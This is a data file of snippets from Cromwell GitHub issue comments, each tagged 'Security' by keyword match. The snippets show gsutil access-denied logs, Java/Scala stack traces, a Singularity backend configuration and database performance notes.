Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11294,access,access,11294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12548,access,access,12548,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/pl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13802,access,access,13802,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2516,access,access,2516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,uteHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withC,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:3945,hash,hash,3945,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,"veats. We also haven't really tested it very extensively yet.; These are the relevant lines from the backend configuration:; ```; submit-docker = """"""; echo ' \; CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"") && \; sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script && \; chmod 775 ${cwd}/execution/script && \; singularity exec --bind /exports:/data/,$CROMWELLROOT:/config docker://${docker} ${script}' | \; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr; """"""; dockerRoot = ""/config""; ```; > This only works if your container has both a /data and /config mount point. I tested this (very shallowly) using biocontainers. Line by line:; 1. `CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"")` ; 1. If dockerRoot is `/cromwell-executions`; 2. The script will contains paths like: `/cromwell-executions/test/<hash>/call-task/execution/rc`; 3. Therefore we need to have the entire structure under the root of the execution folder mounted, as such, we need to bind the entire execution folder.; 4. This gets the path to the root of the execution folder.; - I also tried setting dockerRoot to be the same as `cwd`: `dockerRoot = ""${cwd}""`, but this resulted in `${cwd}` being placed literally in the execution script. If this had been an option we wouldn't have to bind the execution directory separately (I think), but since it isn't we do have to do so.; 1. `sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script` ; - This a bit of a nasty workaround to convert absolute paths used in the commands to what their path would be in the container. This is necessary if you have (eg.) a String type output directory in a command. There are other ways of dealing with this, you could make a /data directory which links to /exports for example.; 1. `chmod 775 ${cwd}/execution/script`; - Make ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799:1082,hash,hash,1082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799,1,['hash'],['hash']
Security,"w gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1014,Validat,ValidatedRuntimeAttributesBuilder,1014,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,2,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,wdl4s and lenthall updated. Fixed test failures and re-singletoned the factory hashing pools.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1379#issuecomment-245914423:79,hash,hashing,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1379#issuecomment-245914423,1,['hash'],['hashing']
Security,well.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:136); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.util.ServiceConfigurationError: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at java.util.ServiceLoader.fail(ServiceLoader.java:239); 	at java.util.ServiceLoader.access$300(ServiceLoader.java:185); 	at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:372); 	at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:5952,access,access,5952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['access'],['access']
Security,"with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; > ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; > _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call; > last):; > File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 75, in <module>; > main(); > File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 22, in main; > project, account = bootstrapping.GetActiveProjectAndAccount(); > File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py"", line 205, in GetActiveProjectAndAccount; > project_name = properties.VALUES.core.project.Get(validate=False); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1221, in Get; > required); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1501, in _GetProperty; > value = _GetPropertyWithoutDefault(prop, properties_file); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; > value = callback(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; > return c_gce.Metadata().Project(); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; > gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; > return func(*args, **kwargs), None; > File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoPr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:1537,validat,validate,1537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['validat'],['validate']
Security,"work bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages on disk are buckets of row values. MySQL accesses the disk at the granularity of a page, it can't fetch just a single value. Therefore, fetching some data from a page (MySQL filtering) versus all data from a page (client-side filtering) does not make a difference in the number of pages read. This is supported by the graph. It would also appear that filtering in memory, whether on client or server, does not have much of a CPU cost at all either for Cromwell nor for MySQL, because we do not see MySQL doing any less work nor Cromwell doing any more. I think this is because once a set of rows is already in memory (after reading a page or receiving the rows over the wire) choosing specific ones is trivial. For MySQL, finding and loading the pages into memory is the hard part.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:2042,access,accesses,2042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,1,['access'],['accesses']
Security,xecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.scala:11); at cromwell.backend.impl.jes.JesWorkflowPaths.toJesCallPaths(JesWorkflowPaths.scala:42); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPaths$lzycompute(JesAsyncBackendJobExecutionActor.scala:108); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPath,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1485,validat,validateCredentials,1485,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['validat'],['validateCredentials']
Security,y(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumen,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4043,hash,hash,4043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,y.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) 